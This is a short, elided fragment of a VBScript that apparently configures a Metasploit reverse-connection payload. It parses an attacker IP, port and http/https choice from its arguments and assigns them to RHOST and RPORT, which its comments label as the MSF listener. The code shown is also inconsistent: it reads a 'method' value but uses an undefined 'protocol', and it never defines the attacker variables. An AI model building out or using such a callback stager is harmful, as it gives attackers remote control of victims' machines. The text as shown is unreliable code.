...
If WScript.Arguments.Count = 3 Then
 ...
 method = Wscript.Arguments.Item(2)
Else
 Wscript.Echo "Usage: Attacker_ip Attacker_port http/https"
 Wscript.Quit
End If
...
Dim RHOST: RHOST = Attacker_ip	' <- MSF Listner IP or Hostname
Dim RPORT: RPORT = Attacker_port			' <- MSF Listner Port
Dim UseHTTPS: UseHTTPS = protocol	' <- Use HTTPS or plain HTTP Payloads: yes/no
